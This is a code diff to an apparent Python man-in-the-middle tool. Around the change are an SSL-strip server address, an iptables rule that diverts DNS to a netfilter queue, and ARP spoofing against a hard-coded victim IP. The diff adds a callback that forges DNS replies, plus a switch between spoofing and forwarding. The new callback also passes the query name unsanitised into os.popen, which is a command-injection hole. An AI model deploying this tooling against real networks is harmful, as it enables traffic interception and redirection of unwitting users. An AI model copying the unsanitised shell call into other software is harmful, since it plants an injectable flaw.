@@ -1,4 +1,6 @@
+# coding=utf-8
 import os
+import re
 import signal
 
 from cleaner import cleaner
@@ -18,7 +20,7 @@ StripServer_IP = '192.168.0.6'  # SSL Strip Server Address
 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 
 
-def callback(data):
+def spoof_callback(data):
     payload = data.get_payload()
     pkt = IP(payload)
 
@@ -46,6 +48,43 @@ def callback(data):
         data.accept()
 
 
+def normal_callback(data):
+    payload = data.get_payload()
+    pkt = IP(payload)
+
+    if not pkt.haslayer(DNSQR):
+        data.accept()
+    else:
+        host = pkt[DNS].qd.qname
+        print "Detect DNS query %s" % host
+
+        output = os.popen('nslookup %s' % host).read()
+
+        for address in re.findall(r"[0-9]+(?:\.[0-9]+){3}", output):
+            if '127' in address:
+                continue
+            else:
+                ip = address
+
+        normal_pkt = \
+            IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+            DNS(
+                id=pkt[DNS].id,
+                qr=1,
+                aa=1,
+                qd=pkt[DNS].qd,
+                an=DNSRR(
+                    rrname=host,
+                    ttl=10,
+                    rdata=ip
+                )
+            )
+        print "%s is %s!" % (host, ip)
+        data.set_payload(str(normal_pkt))
+        data.accept()
+
+
 def run_arp(victim_ip):
     arp = ARP(victim_ip)
     arp.run()
@@ -59,8 +98,14 @@ def exit_handler(queue, process):
 
 
 def main():
+    # 정상적인 DNS 서버 역할의 경우, DNS_Spoofing = False
+    DNSSpoofing = False
+
     q = NetfilterQueue()
-    q.bind(1, callback)
+    if DNSSpoofing:
+        q.bind(1, spoof_callback)
+    else:
+        q.bind(1, normal_callback)
 
     victim_ip = '192.168.0.39'
 
